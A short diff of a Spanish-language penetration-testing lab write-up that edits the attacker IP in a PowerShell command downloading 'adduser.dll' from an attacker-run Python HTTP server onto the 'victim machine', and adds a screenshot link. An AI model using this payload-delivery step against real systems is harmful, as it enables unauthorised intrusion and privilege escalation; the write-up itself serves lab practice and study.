@@ -417,9 +417,10 @@ python3 -m http.server 7777
 
 Descargamos el fichero desde la maquina victima
 ```powershell
-wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
+wget "http://10.10.14.27:7777/adduser.dll" -outfile "adduser.dll"
 ```
 
+<img width="761" height="396" alt="image" src="https://github.com/user-attachments/assets/48040e95-1b95-4ead-b338-11c5d9b7f219" />
 
 
 
